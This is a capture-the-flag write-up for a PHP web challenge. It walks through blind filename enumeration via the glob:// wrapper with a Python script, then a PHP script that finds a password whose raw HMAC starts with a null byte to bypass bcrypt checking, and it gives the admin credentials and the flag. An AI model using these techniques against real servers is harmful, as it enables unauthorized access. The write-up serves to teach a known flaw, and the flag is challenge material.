
# Ways of php

![image](https://user-images.githubusercontent.com/80924519/172225669-8a3bc7fa-1506-4d9b-8ae6-53208a69d842.png)

## Challenge

Lets visit the url:

![image](https://user-images.githubusercontent.com/80924519/172225767-431654e6-6dea-41e5-901e-c7e77bcd4efa.png)

We get the source code of the page itself:

```php
 <?php
    if (isset($_REQUEST['f'])) {
        $c = $_REQUEST['f'];
        try {
        foreach (new DirectoryIterator($c) as $f) echo $f->getSize() . '\r';
        } catch (Exception $e) {
            include 'A4UqCitMd2.html';
        }
        exit;
    }
?> 
```

So what it basically does is, it checks if the parameter `f` is set. If its set it calls the [DirectoryIterator](https://www.php.net/manual/en/class.directoryiterator.php) with getSize:

```
Get size of current DirectoryIterator item 
```

If there is an error it will return the html file(the homepage).

So what it does is, it checks the size of files in a given directory we specify in the parameter as example:

```
http://159.65.232.9:42068/?f=/var/www/html
```

We get:

![image](https://user-images.githubusercontent.com/80924519/172227422-facba3db-3f21-45b9-82d1-69519786d2e8.png)


This are all file sizes in the `/var/www/html` directory. 

So how can we abuse this to get the flag?

## Exploit

So php does have a thing called [`glob://`](https://www.php.net/manual/en/wrappers.glob): 
```
glob:// — Find pathnames matching pattern
```

So we can now use something like:

```
http://159.65.232.9:42068/?f=glob://*.html
```

![image](https://user-images.githubusercontent.com/80924519/172227967-9d95a56b-563a-480f-8928-c8e7e85adfd7.png)


It will show all html file sizes in the current directory where the homepage lives.
So now if we try something like:

```
http://159.65.232.9:42068/?f=glob://1*.html
```

We dont get anything, so only if its true(in this case if there is a filename starting with 1, but there isnt) it will return.
So what we can do here is, do a blind attack to retrieve filenames. So we get the sizes. So to retrieve we use the sizes, when its there it means the letter we specify in the url is correct and a letter from the filename. I created this script:

```py
#!/usr/bin/env python3

import requests
import string 

chars = string.ascii_letters + string.digits

filename = ''
while True:
        for i in chars:
                r = requests.get(f'http://159.65.232.9:42068/?f=glob://{filename + i}*.html')
                print(r.url)
                if "785" in r.text:
                        print("Got correct char")
                        print(i)
                        filename += i
                else:
                        continue

print("The filename is: ", filename)
```
So after we run, we get the filename(it will run and wont stop, script can be improved(I am lazy)). So then we can visit the files we retrieve:

![image](https://user-images.githubusercontent.com/80924519/172230646-4ea2325d-7b04-44e6-94ed-897c1c8ed565.png)

So if we visit: 
```
http://159.65.232.9:42068/A4UqCitMd2.html
```
We get the error page:

![image](https://user-images.githubusercontent.com/80924519/172230739-1f7578e2-b98f-48b3-bcbe-7d7bf1f39535.png)


So now we can retrieve all files, there are some dummy files. The interesting files are:

```
WzNsbej4VS.php
```

It will show a login page:

![image](https://user-images.githubusercontent.com/80924519/172231029-34464367-eae6-4745-b631-67fb211131d9.png)

and the other file:

```
qHkldgoTQ4.tar
```

Lets untar it, we get a login.php file. Source code of the login page. I will only show the interesting part:

```php
<?php 

    $FLAG = 'REDACTED';
    $rp = 'REDACTED';
    $key = 'REDACTED';
    $hash_function = "sha256";

    if (isset($_POST['u']) && isset($_POST['p'])){
        if (md5($_POST['u']) === '21232f297a57a5a743894a0e4a801fc3'){
            $hash = password_hash(hash_hmac("sha256", $rp, $key, true), PASSWORD_BCRYPT);

            if(password_verify(hash_hmac("sha256", $_POST['p'], $key, true), $hash)){
                print $FLAG;
                exit;
            }
        }
        $msg = 'Incorrect!';
    }
?>
```

So now we have the login page and source, lets check how we can exploit this. We know we cant bruteforce because of the delay of 15 seconds(actually we can, but will take some time to run). So in the source we can see, it checks if `u` and `p` is set. So refering to username and password.
If the username hash equals to md5(admin) it will proceed otherwise it will tell incorrect. It will then create a variable called $hash with the `password_hash` function. Its using BCRYPT. Then it will hash our input in the password field and check if its equal. If its equal we will get the flag.

So I searched for weaknesses in `password_verify` and `password_hash`.
When googling: `password_hash php ctf` I found https://blog.pdgn.co/ctf/2016/10/02/tumctf-web300-writeup.html.
Its telling us:

```
Since “raw mode” is used, PHP does not hex-encode the output of the hash function when calling hash(), and so if a null byte is in data passed into password_hash, it’s incredibly easy to break. There’s a great article on this at ircmaxell’s blog that explains this vulnerability much better than I can.
```

So it if our input after hashing contains a null byte it will break/ignore the rest and let us login. So we can check the blog he shared:
https://blog.ircmaxell.com/2015/03/security-issue-combining-bcrypt-with.html

![image](https://user-images.githubusercontent.com/80924519/172233256-f2f12f0b-95fe-4c42-b7b3-32d5a557d0bb.png)

So because they set the parameter `true`, it accepts raw output so also null bytes. So lets copy his script and change the important parts. The key `GamingChair` was given in the discord server:

```php
<?php

$key = "GamingChair";
$hash_function = "sha256";
$i = 0;
$found = [];

while (count($found) < 1) {
    $pw = str_repeat($i, 5);
    $hash = hash_hmac($hash_function, $pw, $key, true);
    if ($hash[0] === "\0") {
        $found[] = $pw;
    }
    $i++;
}

var_dump($i, $found);

?>
```

So what this script does is its looping 1 time, it will create a variable `pw` with 5 times a number(00000, 11111 etc..). It will then create a hash with the given key and `pw`(data). It will then check if the first char of the hashed value equals a null byte, if yes it will add it to the array `found`. It will then dump the array and the index(`$i`). So lets run it:

![image](https://user-images.githubusercontent.com/80924519/172234752-e599e501-296c-438c-9b32-339f95304264.png)

We can now login with the credentials: 
`admin:562562562562562`

If we do that, we get the flag:

![image](https://user-images.githubusercontent.com/80924519/172234925-eb12f0d2-7916-45a1-88a8-4a9e34db5370.png)

`n00bz{D0nt_c0mb1n3_wh4t5_n0t_m34nt_t0_b3_c0mb1n3d}`

It was a nice cool challenge created by GamingChair. 



